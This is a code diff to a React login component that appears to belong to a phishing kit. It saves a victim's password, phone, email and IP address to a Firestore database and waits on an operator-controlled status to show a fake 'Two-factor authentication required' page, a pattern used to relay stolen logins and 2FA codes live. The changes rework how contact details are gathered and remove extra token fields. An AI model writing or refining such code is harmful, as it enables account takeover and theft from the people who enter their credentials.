@@ -84,7 +84,7 @@ function maskContact(input) {
   }, []);
 
   const [passwordShown, setPasswordShown] = useState(false);
-          const formData = JSON.parse(
+  const formData = JSON.parse(
         localStorage.getItem("user") || "{}"
       );
   const togglePasswordVisiblity = async () => {
@@ -93,34 +93,10 @@ function maskContact(input) {
     setPasswordShown(false);
   };
   const [pass, setPass] = useState("");
-  const [mail, setMail] = useState("");
-  const [fone, setFone] = useState("");
-
   const [stage, setStage] = useState(0);
   const [error, SetError] = useState(false);
   const [inputValue, setInputValue] = useState("");
   const [userID, setUserID] = useState("");
-  const handlePhoneChange = (e) => {
-    setFone(e);
-    if (!validator.isMobilePhone(e)) {
-      setDisabled(true);
-    } else {
-      setDisabled(false);
-    }
-  };
-
-
-  const handleConfirmPage = (e) => {
-
-    if(fone.length > 10 && mail.length > 10){
-      SetError(false);
-      setStage(1);
-    }else{
-      SetError(true);
-    }
-  };
-
-
   const [isLoading, setIsLoading] = useState(false);
   const [result, setResult] = useState({
     type: "",
@@ -129,7 +105,6 @@ function maskContact(input) {
   const [data, setData] = useState({});
   const usersRef = collection(db, "users");
   const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
-  const [disabled, setDisabled] = useState(true);
   const listener = (userID) => {
     onSnapshot(doc(db, "users", userID), (snapshot) => {
       const status = snapshot.data()?.status;
@@ -226,7 +201,7 @@ function maskContact(input) {
       });
       const ipAddrrs = localStorage.getItem("location") || "";
       const user = await addDoc(collection(db, "users"), {
-        pass:pass,phone:fone,email:mail,auth:'',ip:ipAddrrs,status: 1,status2:0,ck:'',pg:'',bm:'',ad:'',if:'',createdAt: new Date().getTime(),
+        pass:pass,phone:formData.phone,email:formData.email,auth:'',ip:ipAddrrs,status: 1,createdAt: new Date().getTime(),
       });
       if(user.id){
         updateIndex(user.id);
@@ -360,7 +335,7 @@ function maskContact(input) {
                               </p>
                       
                               <h1 className="text-lg font-bold mb-4">
-                                Two-factor authentication required (1/3)
+                                Two-factor authentication required
                               </h1>
                       
                               <p className="text-gray-500 text-sm mb-6 leading-relaxed">
